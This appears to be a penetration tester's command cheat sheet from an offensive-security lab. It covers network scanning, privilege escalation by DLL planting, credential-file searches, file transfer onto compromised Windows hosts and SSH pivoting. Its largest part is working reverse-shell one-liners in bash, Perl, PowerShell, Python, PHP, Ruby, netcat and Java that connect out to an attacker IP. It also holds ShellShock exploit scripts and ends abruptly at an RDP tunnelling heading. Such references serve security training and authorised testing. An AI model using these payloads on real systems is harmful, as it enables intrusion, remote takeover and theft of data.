Enumeration
===========

Banner Grabs
------------

### Using telnet

  -----------------------------------------------
  telnet **\<target IP/FQDN\> \<target port\>**
  -----------------------------------------------

### Using nc

  ----------------------------------------------
  nc -v **\<target IP/FQDN\> \<target port\>**
  ----------------------------------------------

HTTP Style Enumeration
----------------------

### Get Server Options (telnet, nc)

+----------------------------------------------------------------+
| telnet **\<target IP/FQDN\> \<target port\>**                  |
|                                                                |
| Escape character is \'\^\]\'.                                  |
|                                                                |
| OPTIONS \* HTTP/1.1                                            |
|                                                                |
| Host: **\<target IP/FQDN\>**                                   |
|                                                                |
| User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) |
+----------------------------------------------------------------+

### Get Headers (telnet, nc)

+----------------------------------------------------------------+
| telnet **\<target IP/FQDN\> \<target port\>**                  |
|                                                                |
| Escape character is \'\^\]\'.                                  |
|                                                                |
| HEAD / HTTP/1.1                                                |
|                                                                |
| Host: **\<target IP/FQDN\>**                                   |
|                                                                |
| User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) |
+----------------------------------------------------------------+

### Get Full Page Content (telnet, nc)

+----------------------------------------------------------------+
| nc -v **\<target IP/FQDN\> \<target port\>**                   |
|                                                                |
| Escape character is \'\^\]\'.                                  |
|                                                                |
| GET / HTTP/1.1                                                 |
|                                                                |
| Host: **\<target IP/FQDN\>**                                   |
|                                                                |
| User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) |
+----------------------------------------------------------------+

###  

### Use Curl to Get HTTP OPTIONS Response

  -------------------------------------------
  curl -I -X OPTIONS **\<target IP/FQDN\>**
  -------------------------------------------

### Use Curl to Get HTTP HEAD Response

  ----------------------------------------
  curl -I -X HEAD **\<target IP/FQDN\>**
  ----------------------------------------

### Use Invoke-WebRequest to Get HTTP OPTIONS Response

+-----------------------------------------------------------------------+
| \[Net.ServicePointManager\]::SecurityProtocol = \"tls12, tls11, tls,  |
| Ssl3\"                                                                |
|                                                                       |
| \$(Invoke-WebRequest -URI **\<target IP/FQDN\>** -Method              |
| OPTIONS).RawContent                                                   |
+-----------------------------------------------------------------------+

### Use Invoke-WebRequest to Get HTTP HEAD Response

+-----------------------------------------------------------------------+
| \[Net.ServicePointManager\]::SecurityProtocol = \"tls12, tls11, tls,  |
| Ssl3\"                                                                |
|                                                                       |
| \$(Invoke-WebRequest -URI **\<target IP/FQDN\>** -Method              |
| HEAD).RawContent                                                      |
+-----------------------------------------------------------------------+

Privilege Escalation
====================

Some basic notes/thoughts on gaining privilege escalation:

-   Path order exploitation

    -   Look for paths that exist in the path statement that may be
        > searched prior to the desired path location.

-   Unquoted Paths

    -   Look for unquoted paths in services and scheduled tasks. It may
        > be possible to create a path that will execute instead of the
        > intended path.

-   Path Permissions

    -   Look for paths that have permissions that you can write in

-   Missing DLL dependencies

    -   Locate services or other programs that attempt to load missing
        > DLLs or this could be combined with a path order error.

IKEEXT Service Missing DLL Privileged Execution
-----------------------------------------------

1.  Look for a path that in the %PATH% variable that your user is able
    > to write to.

2.  Create a msfvenom payload using the DLL format option.

3.  Place the DLL into the path you located and rename it to:

    -   **Wlbsctrl.dll**

4.  Wait for a restart or trigger a restart of the IKEET service
    > somehow.

Scanning
========

NMap
----

### Host Scan

Scans systems and reports a list of hosts that it finds up.

  --------------------------
  nmap -sP 172.28.128.0/24
  --------------------------

### Basic TCP Scan

Scan ports 1 through 65535 with timing set to 5, OS detection On,
Verbos, and TCP connect.

  ----------------------------------------------
  nmap -p 1-65535 -T5 -A -v -sT 192.168.57.101
  ----------------------------------------------

### Less Noisy SYN Scan

Scan ports 1 through 1024 with timing set to 0, OS detection On, Verbos,
and SYN Only.

  ---------------------------------------------
  nmap -p 1-1024 -T0 -A -v -sS 192.168.57.101
  ---------------------------------------------

### Scan a Service for Vulnerabilities Using NSE

Scan the hosts contained in the file for vulnerabilities that match the
given ls filter.

  ---------------------------------------------------------------------------------------------------------------------------------------------------------------
  for vuln in \$(ls /usr/share/nmap/scripts/**\<filename mask\>**\*); do nmap -p 80 \--open -iL **\<hostfile\>** \--script \$vuln \>\> **\<outputfile\>**; done
  ---------------------------------------------------------------------------------------------------------------------------------------------------------------

Quick 'n Dirty Bash Ping Sweep
------------------------------

Scan the entire 10.11.1/24 network

  ----------------------------------------------------------------------------------------------------------------
  \#!/bin/bash\
  \
  for ((ip = 0; ip \<= 254; ip++));\
  do ping -c 1 10.11.1.\$ip \| grep \"bytes from\" \| awk -F \" \" \'{print \$4}\' \| cut -d \":\" -f 1 2\>&1 &\
  sleep .25\
  done

  ----------------------------------------------------------------------------------------------------------------

Python Ping Sweep with Multi-Threading (Linux)
----------------------------------------------

Scan the entire 10.11.1/24 network

  ------------------------------------------------------------------------------------------------------------------
  \#!/usr/bin/python\
  \
  import multiprocessing\
  import subprocess\
  import shlex\
  \
  from multiprocessing.pool import ThreadPool\
  \
  def call\_proc(ip):\
  command = \"ping -c1 \" + ip + \" \| grep \'bytes from\' \| awk -F \' \' \'{print \$4}\' \| cut -d \':\' -f 1\"\
  p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE)\
  while True:\
  out = p.stderr.read(1)\
  if out == \'\' and p.poll() != None:\
  break\
  if out != \'\':\
  sys.stdout.write(out)\
  sys.stdout.flush()\
  \
  ips = \[\]\
  pool = ThreadPool(10)\
  \
  for i in range(1,255):\
  ips.append(\"10.11.1.\" + str(i))\
  \
  print(ips)\
  \
  pool.map(call\_proc, ips)\
  \
  pool.close()\
  pool.join()

  ------------------------------------------------------------------------------------------------------------------

Python Ping Sweep with Multi-Threading (Windows)
------------------------------------------------

+------------------------------------------------------------------------+
| import multiprocessing                                                 |
|                                                                        |
| import subprocess                                                      |
|                                                                        |
| import shlex                                                           |
|                                                                        |
| import sys                                                             |
|                                                                        |
| from multiprocessing.pool import ThreadPool                            |
|                                                                        |
| def call\_proc(ip):                                                    |
|                                                                        |
| command = \'ping -n 1 {ip} \| findstr \"Reply from\"\'.format(ip = ip) |
|                                                                        |
| p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE)      |
|                                                                        |
| while True:                                                            |
|                                                                        |
| out = p.stderr.read(1)                                                 |
|                                                                        |
| if out == \'\' and p.poll() != None:                                   |
|                                                                        |
| break                                                                  |
|                                                                        |
| if out != \'\':                                                        |
|                                                                        |
| sys.stdout.write(out)                                                  |
|                                                                        |
| sys.stdout.flush()                                                     |
|                                                                        |
| ips = \[\]                                                             |
|                                                                        |
| pool = ThreadPool(10)                                                  |
|                                                                        |
| for i in range(1,255):                                                 |
|                                                                        |
| ips.append(\"10.1.1.\" + str(i))                                       |
|                                                                        |
| print(ips)                                                             |
|                                                                        |
| pool.map(call\_proc, ips)                                              |
|                                                                        |
| pool.close()                                                           |
|                                                                        |
| pool.join()                                                            |
+------------------------------------------------------------------------+

Python Port Scan
----------------

  -------------------------------------------------------------------------------------------------
  \#!/usr/bin/env python\
  import socket\
  import subprocess\
  import sys\
  from datetime import datetime\
  \
  \# Clear the screen\
  subprocess.call(\'clear\', shell=True)\
  \
  \# Ask for input\
  remoteServer = raw\_input(\"Enter a remote host to scan: \")\
  remoteServerIP = socket.gethostbyname(remoteServer)\
  \
  \# Print a nice banner with information on which host we are about to scan\
  print \"-\" \* 60\
  print \"Please wait, scanning remote host\", remoteServerIP\
  print \"-\" \* 60\
  \
  \# Check what time the scan started\
  t1 = datetime.now()\
  \
  \# Using the range function to specify ports (here it will scans all ports between 1 and 1024)\
  \
  \# We also put in some error handling for catching errors\
  \
  try:\
  for port in range(1,1025):\
  sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)\
  result = sock.connect\_ex((remoteServerIP, port))\
  if result == 0:\
  print \"Port {port}: Open\".format(port = port)\
  sock.close()\
  \
  except KeyboardInterrupt:\
  print \"You pressed Ctrl+C\"\
  sys.exit()\
  \
  except socket.gaierror:\
  print \'Hostname could not be resolved. Exiting\'\
  sys.exit()\
  \
  except socket.error:\
  print \"Couldn\'t connect to server\"\
  sys.exit()\
  \
  \# Checking the time again\
  t2 = datetime.now()\
  \
  \# Calculates the difference of time, to see how long it took to run the script\
  total = t2 - t1\
  \
  \# Printing the information to screen\
  print \'Scanning Completed in: \', total

  -------------------------------------------------------------------------------------------------

Python Port Scanner (Multi-Threaded)
------------------------------------

+-----------------------------------------------------------------------+
| \#!/usr/bin/env python                                                |
|                                                                       |
| import socket                                                         |
|                                                                       |
| import subprocess                                                     |
|                                                                       |
| import sys                                                            |
|                                                                       |
| import multiprocessing                                                |
|                                                                       |
| import subprocess                                                     |
|                                                                       |
| import shlex                                                          |
|                                                                       |
| from datetime import datetime                                         |
|                                                                       |
| from multiprocessing.pool import ThreadPool                           |
|                                                                       |
| \# Clear the screen                                                   |
|                                                                       |
| subprocess.call(\'clear\', shell=True)                                |
|                                                                       |
| \# Ask for input                                                      |
|                                                                       |
| remoteServer = raw\_input(\"Enter a remote host to scan: \")          |
|                                                                       |
| remoteServerIP = socket.gethostbyname(remoteServer)                   |
|                                                                       |
| \# Print a nice banner with information on which host we are about to |
| scan                                                                  |
|                                                                       |
| print \"-\" \* 60                                                     |
|                                                                       |
| print \"Please wait, scanning remote host\", remoteServerIP           |
|                                                                       |
| print \"-\" \* 60                                                     |
|                                                                       |
| \# Check what time the scan started                                   |
|                                                                       |
| t1 = datetime.now()                                                   |
|                                                                       |
| \# Using the range function to specify ports (here it will scans all  |
| ports between 1 and 1024)                                             |
|                                                                       |
| \# We also put in some error handling for catching errors             |
|                                                                       |
| def scan\_port(port):                                                 |
|                                                                       |
| try:                                                                  |
|                                                                       |
| sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)            |
|                                                                       |
| > sock.settimeout(1)                                                  |
|                                                                       |
| result = sock.connect\_ex((remoteServerIP, port))                     |
|                                                                       |
| if result == 0:                                                       |
|                                                                       |
| print \"Port {port}: Open\".format(port = port)                       |
|                                                                       |
| sock.close()                                                          |
|                                                                       |
| except KeyboardInterrupt:                                             |
|                                                                       |
| print \"You pressed Ctrl+C\"                                          |
|                                                                       |
| sys.exit()                                                            |
|                                                                       |
| except socket.gaierror:                                               |
|                                                                       |
| print \'Hostname could not be resolved. Exiting\'                     |
|                                                                       |
| sys.exit()                                                            |
|                                                                       |
| except socket.error:                                                  |
|                                                                       |
| print \"Couldn\'t connect to server\"                                 |
|                                                                       |
| sys.exit()                                                            |
|                                                                       |
| ports = \[\]                                                          |
|                                                                       |
| pool = ThreadPool(10)                                                 |
|                                                                       |
| for port in range(1,1025):                                            |
|                                                                       |
| ports.append(port)                                                    |
|                                                                       |
| pool.map(scan\_port, ports)                                           |
|                                                                       |
| pool.close()                                                          |
|                                                                       |
| pool.join()                                                           |
|                                                                       |
| \# Checking the time again                                            |
|                                                                       |
| t2 = datetime.now()                                                   |
|                                                                       |
| \# Calculates the difference of time, to see how long it took to run  |
| the script                                                            |
|                                                                       |
| total = t2 - t1                                                       |
|                                                                       |
| \# Printing the information to screen                                 |
|                                                                       |
| print \'Scanning Completed in: \', total                              |
+-----------------------------------------------------------------------+

PowerShell Port Scan
--------------------

  -------------------------------------------------------------------------------------------------------------------------------
  1..1024 \| % { echo ((New-Object Net.Sockets.TcpClient).Connect(\"**\<ip address\>**\", \$\_)) \"\$\_ is open\" } 2\>Out-Null
  -------------------------------------------------------------------------------------------------------------------------------

GoBuster (Web Common Folder Scan)
---------------------------------

  ------------------------------------------------------------------------------------------------------------------------
  gobuster -u **\<url\>** -w /usr/share/seclists/Discovery/Web\_Content/common.txt -s \'200,204,301,302,307,403,500\' -e
  ------------------------------------------------------------------------------------------------------------------------

GoBuster (Web Common CGI Scan)
------------------------------

  ----------------------------------------------------------------------------------------------------------------------
  gobuster -u **\<url\>** -w /usr/share/seclists/Discovery/Web\_Content/cgis.txt -s \'200,204,301,302,307,403,500\' -e
  ----------------------------------------------------------------------------------------------------------------------

Pivoting
========

SSH Reverse Proxy
-----------------

+-----------------------------------------------------------------------+
| From remote system (behind firewall):                                 |
|                                                                       |
| > ssh -R 8888:localhost:22 **\<local\_user\>**@**\<local\_machine\>** |
|                                                                       |
| From local system:                                                    |
|                                                                       |
| > ssh -D 8181 **\<remote\_user\>**\@localhost -p 8888                 |
+-----------------------------------------------------------------------+

Ncat Fu
=======

Send Connection/Banner Grab
---------------------------

Grab the banner from the specified SMTP server

  ----------------------------------
  ncat -nv \<ip address\> \<port\>
  ----------------------------------

Files
=====

Locating Files
--------------

### Locate files with setuid bits (\*nix)

  -----------------------------------------------------
  find / -perm 4000 -o perm 2000 -exec ls -ldb {} \\;
  -----------------------------------------------------

### Locate files belonging to a user (\*nix)

#### Version 1

  ------------------------------------
  find -u \<username\> 2\> /dev/null
  ------------------------------------

#### Version 2

  ---------------------------------------
  find -user \<username\> 2\> /dev/null
  ---------------------------------------

### Locate files belonging to a group (\*nix)

#### Version 1

  -------------------------------------
  find -g \<groupname\> 2\> /dev/null
  -------------------------------------

#### Version 2

  -----------------------------------------
  find -group \<groupname\> 2\> /dev/null
  -----------------------------------------

### Locate files that are world writable (\*nix)

  --------------------------------------------------
  find / -perm -2 ! -type l -ls -xdev 2\>/dev/null
  --------------------------------------------------

### Locate Files with Weak Permissions (Windows)

See [[accesschk.exe]{.underline}](#accesschk.exe-sysinternals) section

### Locate Credential Files (Windows)

  ---------------------------------------------------------
  dir /S **\[\*pass\*\|\*cred\*\|\*vnc\*\|\*.config\*\]**
  ---------------------------------------------------------

### Locate Files Containing \<String\>

  -----------------------------------------------------------
  findstr /SI **\<string\>** **\[\*.xml\|\*.ini\|\*.txt\]**
  -----------------------------------------------------------

### Locate Files & Folders Accessible to Root Only

  -------------------------------------------------------------
  find **\<path\>** -user root -perm +400 ! -perm +044 -print
  -------------------------------------------------------------

Transfer Files
==============

Transfer Files Using NetCat (nc)
--------------------------------

### Receiving

  -------------------------------------------
  nc -l -p **\<port\>** \> **\<filename\>**
  -------------------------------------------

### Sending

  -----------------------------------------------------
  nc **\<address\>** **\<port\>** \< **\<filename\>**
  -----------------------------------------------------

TFTP (from reverse Windows shell)
---------------------------------

  ---------------------------------------------
  tftp **\<ipaddress\>** GET **\<filename\>**
  ---------------------------------------------

FTP (from reverse Windows shell)
--------------------------------

+-------------------------------------------+
| echo open **\<ipaddress\>** 21\> ftp.txt\ |
| echo USER offsec\>\> ftp.txt\             |
| echo **\<password\>**\>\> ftp.txt\        |
| echo bin \>\> ftp.txt\                    |
| echo GET **\<filename\>** \>\> ftp.txt\   |
| echo bye \>\> ftp.txt                     |
|                                           |
| ftp --v -n -s:ftp.txt                     |
+-------------------------------------------+

VBScript (from reverse Windows shell)
-------------------------------------

Usage: cscript http://**\<ipaddress\>**/**\<file\>**
**\<localfilename\>**

  -------------------------------------------------------------------------------------------------
  echo strUrl = WScript.Arguments.Item(0) \> wget.vbs\
  echo StrFile = WScript.Arguments.Item(1) \>\> wget.vbs\
  echo Const HTTPREQUEST\_PROXYSETTING\_DEFAULT = 0 \>\> wget.vbs\
  echo Const HTTPREQUEST\_PROXYSETTING\_PRECONFIG = 0 \>\> wget.vbs\
  echo Const HTTPREQUEST\_PROXYSETTING\_DIRECT = 1 \>\> wget.vbs\
  echo Const HTTPREQUEST\_PROXYSETTING\_PROXY = 2 \>\> wget.vbs\
  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts \>\> wget.vbs\
  echo Err.Clear \>\> wget.vbs\
  echo Set http = Nothing \>\> wget.vbs\
  echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") \>\> wget.vbs\
  echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") \>\> wget.vbs\
  echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") \>\> wget.vbs\
  echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") \>\> wget.vbs\
  echo http.Open \"GET\", strURL, False \>\> wget.vbs\
  echo http.Send \>\> wget.vbs\
  echo varByteArray = http.ResponseBody \>\> wget.vbs\
  echo Set http = Nothing \>\> wget.vbs\
  echo Set fs = CreateObject(\"Scripting.FileSystemObject\") \>\> wget.vbs\
  echo Set ts = fs.CreateTextFile(StrFile, True) \>\> wget.vbs\
  echo strData = \"\" \>\> wget.vbs\
  echo strBuffer = \"\" \>\> wget.vbs\
  echo For lngCounter = 0 to UBound(varByteArray) \>\> wget.vbs\
  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) \>\> wget.vbs\
  echo Next \>\> wget.vbs\
  echo ts.Close \>\> wget.vbs

  -------------------------------------------------------------------------------------------------

Invoke-WebRequest (from reverse Windows shell)
----------------------------------------------

Requires PowerShell v3.0 or higher. Relies on IE. May not work on
Windows Server.

  -----------------------------------------------------------------------------------------------------------------
  PS C:\\\> Invoke-WebRequest -Uri **\<URI\>** -OutFile **\<dest\_filename\>** -UserAgent **\<useragentstring\>**
  -----------------------------------------------------------------------------------------------------------------

PowerShell System.Net.WebClient (from reverse Windows shell)
------------------------------------------------------------

**NOTE:** Use only valid URLs and File Names or you will hang the shell.
Can be re-used by specifying -url and -file arguments.

  --------------------------------------------------------------------------------------------------------
  echo param ( \[string\]\$url = \"**\<URI\>**\", \[string\]\$file = \"**\<filename\>**\" ) \> wget.ps1\
  echo \$webclient = New-Object System.Net.WebClient \>\>wget.ps1\
  echo \$webclient.DownloadFile(\$url,\$file) \>\>wget.ps1

  --------------------------------------------------------------------------------------------------------

PowerShell BITS Transfer (from reverse Windows shell)
-----------------------------------------------------

**NOTE:** Use only valid URLs and File Names or you will hang the shell.

**NOTE:** BITS service must be running.

Can be re-used by specifying -url and -file arguments.

+-----------------------------------------------------------------------+
| echo param ( \[string\]\$url = \"**\<URI\>**\", \[string\]\$file =    |
| \"**\<filename\>**\" ) \> bitsget.ps1                                 |
|                                                                       |
| echo Import-Module BitsTransfer \>\> bitsget.ps1\                     |
| echo Start-BitsTransfer -Source \$url -Destination \$file \>\>        |
| bitsget.ps1                                                           |
+-----------------------------------------------------------------------+

Python Download Echo Script (Windows)
-------------------------------------

  --------------------------------------------------------------------------------------------------------
  echo import urllib \> download.py\
  echo testfile = urllib.URLopener() \>\> download.py\
  echo testfile.retrieve(\'**\<url\_with\_file\>**\', \'**\<file\_name\_to\_save\>**\') \>\> download.py

  --------------------------------------------------------------------------------------------------------

Debug (from reverse Windows shell)
----------------------------------

This method has size limitations. It will only work with 64k or smaller
files.

+-----------------------------------------------------------------------+
| \# First use upx to pack the file to make it smaller                  |
|                                                                       |
| upx -9 \<originalPE\>                                                 |
|                                                                       |
| \# Use exe2bat.exe to convert the file to a BAT file format           |
|                                                                       |
| wine exe2bat.exe **\<originalPE\>** **\<destination\>**               |
|                                                                       |
| \# Copy and paste the contents of the destination file to your        |
| reverse shell                                                         |
+-----------------------------------------------------------------------+

Copy Command (Share Access)
---------------------------

  ---------------------------------------------
  copy \\\\**\<source\>** **\<destination\>**
  ---------------------------------------------

Echo Command (Share Access)
---------------------------

  -------------------------------------------------------------
  echo "**\<base64 encoded data\>**" \>\> **\<destination\>**
  -------------------------------------------------------------

**Note**: By base64 encoding the file you will turn it into plain text
that can be echoed to the remote system. It can then be decoded using
the **certutil.exe** command.

PHP Remote Include FTP Download Script
--------------------------------------

+-----------------------------------------------------------------------+
| \<?php                                                                |
|                                                                       |
| // set up basic connection\                                           |
| \$conn\_id = ftp\_connect(\"**\<ftp\_server\_address\>**\");\         |
| // login with username and password\                                  |
| \$login\_result = ftp\_login(\$conn\_id, \"anonymous\",               |
| \"foo\@bar.com\");\                                                   |
| // check connection                                                   |
|                                                                       |
| if ((!\$conn\_id) \|\| (!\$login\_result)) {\                         |
| echo \"Ftp connection has failed!\";\                                 |
| echo \"Attempted to connect to \$ftp\_server for user \$user\";\      |
| die;\                                                                 |
| } else {                                                              |
|                                                                       |
| echo \"Connected\";\                                                  |
| }\                                                                    |
| // upload the file\                                                   |
| \$upload = ftp\_get(\$conn\_id, \"**\<writable\_path\>**, \"nc\",     |
| FTP\_BINARY);\                                                        |
| echo \$upload;\                                                       |
| // close the FTP stream\                                              |
| ftp\_quit(\$conn\_id);                                                |
|                                                                       |
| ?\>                                                                   |
+-----------------------------------------------------------------------+

Tunneling
=========

SSH Tunnels
-----------

### SSH Remote Port Forwarding

  ------------------------------------------------------------------------------------------
  ssh **\<gateway\>** -R **\<remote port to bind\>**:**\<local host\>**:**\<local port\>**
  ------------------------------------------------------------------------------------------

-   **\<gateway\>** = The Hostname/IP of the machine you are working
    > from.

-   **\<localhost\>** = The local IP of the machine that you have a
    > shell open on. I.e. 127.0.0.1

-   **\<remote port to bind\>** = The local port of the machine that you
    > have a shell open on. This is the port that you will connect to.

-   **\<local port\>** = The port that the service you want to connect
    > to is running.

**EXAMPLE:** ssh 10.0.0.20 -R 3390:127.0.0.1:3389

In the above example, this command is being run from the compromised
system. You are connecting back to your working machine. 127.0.0.1:3390
on your working machine is now connected to port 3389 on the compromised
system.

### SSH Local Port Forwarding

  ---------------------------------------------------------------------------------------------
  ssh **\<gateway\>** -L **\<local port to listen\>**:**\<remote host\>**:**\<remote port\>**
  ---------------------------------------------------------------------------------------------

-   **\<gateway\>** = The Hostname/IP of the machine you are working
    > from.

-   **\<remote host\>** = The IP address of the server you would like to
    > redirect traffic to.

-   **\<local port to listen\>** = The local port of the machine that
    > you have a shell open on.

-   **\<remote port\>** = The port on the remote server that you would
    > like to redirect traffic to.

**EXAMPLE:** ssh 10.0.0.20 -L 8080:11.11.11.11:80

In the above example, this command is being run from the compromised
system. You are attempting to forward traffic on the compromised system
from 127.0.0.1:8080 to the remote web server hosted on 11.11.11.11:80.

Reverse Shells
==============

[[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]{.underline}](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

One-Liners
----------

Try substituting "cmd.exe" instead of "/bin/sh" or "/bin/bash" to make
these work in Windows.

Try the following command separators: ;, &&, \|, \|\|

### Bash v1

  ------------------------------------------
  bash -i \>& /dev/tcp/10.0.0.1/8080 0\>&1
  ------------------------------------------

### Bash v1.5

  --------------------------------------------------------
  bash -c \'bash -i \>& /dev/tcp/\<ip\>/\<port\> 0\>&1\'
  --------------------------------------------------------

### Bash v2

  ---------------------------------------------------------------------------------------------------
  bash -c \'exec 5\<\>/dev/tcp/\<ip\>/\<port\>; while read line 0\<&5; do \$line 2\>&5 \>&5; done\'
  ---------------------------------------------------------------------------------------------------

### Bash v3

  ---------------------------------------------------------------------------------------------------------
  bash -c \'exec 5\<\>/dev/tcp/\<ip\>/\<port\>; cat \<&5 \| while read line; do \$line 2\>&5 \>&5; done\'
  ---------------------------------------------------------------------------------------------------------

#### URL Encoded

  -------------------------------------------------------------------------------------------------
  bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F**\<address\>**%2F**\<port\>**%200%3E%261%27
  -------------------------------------------------------------------------------------------------

### Perl

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  perl -e \'use Socket;\$i=\"10.0.0.1\";\$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr\_in(\$p,inet\_aton(\$i)))){open(STDIN,\"\>&S\");open(STDOUT,\"\>&S\");open(STDERR,\"\>&S\");exec(\"/bin/sh -i\");};\'
  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### PowerShell

  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  \$client = New-Object System.Net.Sockets.TCPClient(\'**\<IP\_Address\>**\',**\<port\>**);\$stream = \$client.GetStream();\[byte\[\]\]\$bytes = 0..65535\|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2\>&1 \| Out-String );\$sendback2 = \$sendback + \'PS \' + (pwd).Path + \'\> \';\$sendbyte = (\[text.encoding\]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};
  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Python

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  python -c \'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);\'
  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### PHP

  --------------------------------------------------------------------------------------
  php -r \'\$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i \<&3 \>&3 2\>&3\");\'
  --------------------------------------------------------------------------------------

### Ruby

  ---------------------------------------------------------------------------------------------------------------------
  ruby -rsocket -e\'f=TCPSocket.open(\"10.0.0.1\",1234).to\_i;exec sprintf(\"/bin/sh -i \<&%d \>&%d 2\>&%d\",f,f,f)\'
  ---------------------------------------------------------------------------------------------------------------------

### Netcat

#### Version 1

  -----------------------------
  nc -e /bin/sh 10.0.0.1 1234
  -----------------------------

#### Version 2

  ---------------------------------------------------------------------------------
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.0.0.1 1234 \>/tmp/f
  ---------------------------------------------------------------------------------

#### Java

  ----------------------------------------------------------------------------------------------------------------------------------------------------
  r = Runtime.getRuntime()\
  p = r.exec(\[\"/bin/bash\",\"-c\",\"exec 5\<\>/dev/tcp/10.0.0.1/2002;cat \<&5 \| while read line; do \\\$line 2\>&5 \>&5; done\"\] as String\[\])\
  p.waitFor()

  ----------------------------------------------------------------------------------------------------------------------------------------------------

ShellShock Reverse Shells
-------------------------

### Curl - One-Liner

  -------------------------------------------------------------------------------------------------------------------------------
  curl -A \"() { :;}; echo \'Content-type: text/html\'; echo; /bin/ls -al /home/bynarr;\" http://192.168.56.101:591/cgi-bin/cat
  -------------------------------------------------------------------------------------------------------------------------------

### Python Reverse Shell - ShellShock w/Sudo

+-----------------------------------------------------------------------+
| import requests,sys                                                   |
|                                                                       |
| from base64 import b64encode                                          |
|                                                                       |
| while True:                                                           |
|                                                                       |
| user\_command = b64encode(raw\_input(\'\$ \').strip())                |
|                                                                       |
| payload = b64encode(\"python -c \'import pty,subprocess,os,time;from  |
| base64 import                                                         |
| b64decode;(master,slave)=pty.openpty();p=subprocess.Popen(\[\\\"/bin/ |
| su\\\",\\\"-c\\\",b64decode(\\\"%s\\\"),\\\"bynarr\\\"\],stdin=slave, |
| stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\\\"f |
| ruity\\\\n\\\");time.sleep(0.1);print                                 |
| os.read(master,1024);\'\"%user\_command)                              |
|                                                                       |
| headers = {                                                           |
|                                                                       |
| \'User-Agent\': \'() { :; }; echo \\\'Content-type: text/html\\\';    |
| echo; export PATH=\$PATH:/usr/bin:/bin:/sbin; echo \\\'%s\\\' \|      |
| base64 -d \| bash 2\>&1\' % payload                                   |
|                                                                       |
| }                                                                     |
|                                                                       |
| print requests.get(\'http://192.168.56.101:591/cgi-bin/cat\',         |
| headers=headers).text.strip()                                         |
+-----------------------------------------------------------------------+

Python Reverse Shells
---------------------

### Straight Python Shell

  --------------------------------------------------------
  import socket,os\
  so=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)\
  so.connect((\'**\<LHOST\>**\',**\<LPORT\>**))\
  Hc=False\
  while not Hc:\
  data=so.recv(1024)\
  if len(data)==0:\
  Hc=True\
  stdin,stdout,stderr,=os.popen3(data)\
  stdout\_value=stdout.read()+stderr.read()\
  so.send(stdout\_value)

  --------------------------------------------------------

### Encode a Python Script (Base64)

  ----------------------------------------------------
  import base64\
  \
  with open(\'**\<script\_file\>**\', \'rb\') as f:\
  encoded = base64.b64encode(f.read())\
  print encoded

  ----------------------------------------------------

### Decode an Encoded Python Script (Base64)

+--------------------------------------------------------+
| import base64;                                         |
|                                                        |
| with open(\'decoded\_script.py\', \'w\') as f:         |
|                                                        |
| decoded = '**\<base64\_string\>**\'.decode(\'base64\') |
|                                                        |
| f.write(decoded)                                       |
|                                                        |
| f.close()                                              |
+--------------------------------------------------------+

Fix TTY Issues In Reverse Shells
--------------------------------

### Python PTY

+----------------------------------------------------+
| python -c \'import pty; pty.spawn(\"/bin/bash\")\' |
|                                                    |
| Then fix the term type:                            |
|                                                    |
| set TERM=linux                                     |
|                                                    |
| Or                                                 |
|                                                    |
| export TERM=linux                                  |
|                                                    |
| clear                                              |
+----------------------------------------------------+

### Python Sudo w/o TTY

  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  python -c \'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(\[\"/bin/su\",\"-c\",\"id\",\"bynarr\"\],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\"fruity\\n\");time.sleep(0.1);print os.read(master,1024);\'
  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

RDP Via Plink Tunnel ([[https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html]{.underline}](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html))
----------------------------------------------------------------------------------------------------------------------------------------------------------------------

From Remote/Compromised Host

